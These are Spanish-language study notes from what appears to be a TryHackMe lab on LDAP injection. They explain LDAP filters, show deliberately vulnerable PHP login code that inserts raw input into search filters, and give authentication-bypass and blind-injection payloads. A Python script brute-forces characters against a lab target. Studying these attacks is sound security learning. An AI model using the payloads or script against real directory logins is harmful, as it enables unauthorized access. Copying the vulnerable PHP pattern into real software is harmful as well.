# Introducción

LDAP, es un estadar "Lightweight Directory Acess Protocol" es un protocolo usado para acceder y mantener servicios de informacion con directorios distribuido a traves del protocolo de Internet (IP). LDAP centraliza los usuarios, en grupos o ifnromación de directoris

# Objetivos

- Entender como funciona LDAP y su rol
- Explorar la estructura y los componentes clave
- Introducir a la injección de LDAP, impacto, y como se explota.
- Participar y conocer las habilidades e identificar y mitigar las vulnerabilidades

# Estructura

En LDAP, las entradas de directorios estan estructurados como objetos, 

Servicios que usa

- Microsoft Active Directory: Un sericio de las redes de WIndows, utiliza LDAP como parte de protocolo de control de recursos.
- OpenLDAP: UN open source, que tmabién funciona como suport de mecanismo de autentificación y control de recursos.

## LDIF Format

Las entradas de LDAP se representan  usando LDAP Data INtechange Format (LDIF), es su extandar como texto plano que representan los direcotrios de LDAP

## Estructura

![image](https://github.com/user-attachments/assets/080a7073-e77a-41c2-83c3-8dadf30f72ad)

# Buscar consultas

LDAP busca consultas que son fundamentales en la interaccion con los directorios de LDAP, puediendo localizar y recibir información decualqueir directorio

Sintaxis:

```
(base DN) (scope) (filter) (attributes)
```

## Ejemplos

Filtro simple:

```
(cn=John Doe)
```

Wildcart

```
(cn=J*)
```

Operador logico

```
(&(objectClass=user)(|(cn=John*)(cn=Jane*)))
```

```
user@tryhackme$ ldapsearch -x -H ldap://MACHINE_IP:389 -b "dc=ldap,dc=thm" "(ou=People)"
# extended LDIF
#
# LDAPv3
# base <dc=ldap,dc=thm> with scope subtree
# filter: (ou=People)
# requesting: ALL
#

# People, ldap.thm
dn: ou=People,dc=ldap,dc=thm
objectClass: organizationalUnit
objectClass: top
ou: People

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

# Fundamentos de Injeccion

Ldap es una vulnerabilidad critica que ocurre cunado el usuario puede inputear y no sanitizar bien e incorporar las consultas. 

## Vectores comunes

- Authentification Bypass
- Unauthorized Data Access
- Data Manipulation

![image](https://github.com/user-attachments/assets/fea94ffc-9e8f-4bc5-a734-f5b0236de254)

# Explotar LDAP

Ejemplo de PHP de una aplicación

```
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost";
$ldap_dn = "ou=People,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm";
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

// LDAP search filter
$filter = "(&(uid=$username)(userPassword=$password))";

// Perform the LDAP search
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

// Check if the search was successful
if ($search_result) {
    // Retrieve the entries from the search result
    $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    $message = "Welcome, " . $entry['cn'][0] . "!\n";
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    $error = "LDAP search failed\n";
}
?>
```
Este código es vulnerable porque directamente el usuario puede meter un input en las variables username y password dentro de la consulta el atacante puede meter una injección

El acatacante pone un usuario con un dfiltro por ejemplo * y lo insertar sera tal a uid=*

## Técnicas

Tautology

```
(&(uid={userInput})(userPassword={passwordInput}))
```

```
(&(uid=*)(|(&)(userPassword=pwd)))
```

Wildcard

```
(&(uid={userInput})(userPassword={passwordInput}))
```

## Ejemplos

```
username=*&password=*
```

![image](https://github.com/user-attachments/assets/bafc227c-9a22-48f6-baac-4c1d92fa4579)

![image](https://github.com/user-attachments/assets/236cfd78-b0ca-41fc-8ecb-b0459f434031)

# Blind LDAP Injection

```
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost"; 
$ldap_dn = "ou=users,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm"; 
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

$filter = "(&(uid=$username)(userPassword=$password))";
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

if ($search_result) {
   $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    if($entry['uid'][0] === $_POST['username']){
                        $message = "Welcome, " . $entry['cn'][0] . "!\n";
                    }else{
                        $message = "Something is wrong in your password.\n";
                    }
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    echo "LDAP search failed\n";
}

ldap_close($ldap_conn);
```

El código es vulnerable el atacante por ejemplo podría añadir parametros

```
username=a*%29%28%7C%28%26&password=pwd%29
```

![image](https://github.com/user-attachments/assets/96c3a7a0-a49b-41e6-b3b7-4c55a77aa95e)

```
(&(uid=a*)(|(&)(userPassword=pwd)))
```

![image](https://github.com/user-attachments/assets/16ff9a60-b40a-448e-9096-76d9de921bda)

```
username=ab*%29%28%7C%28%26&password=pwd%29
```

![image](https://github.com/user-attachments/assets/0b7bd0f6-fe92-4243-bf66-7af9791b2fa5)

```
(&(uid=ab*)(|(&)(userPassword=pwd)))
```

![image](https://github.com/user-attachments/assets/b962d2a6-9a2e-441f-b931-a95eef6de879)

# Automatizar la Explotación


Script de automatización

```
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://MACHINE_IP/blind.php'

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```

![image](https://github.com/user-attachments/assets/adc816b8-4677-465f-a785-985d30ce3f81)









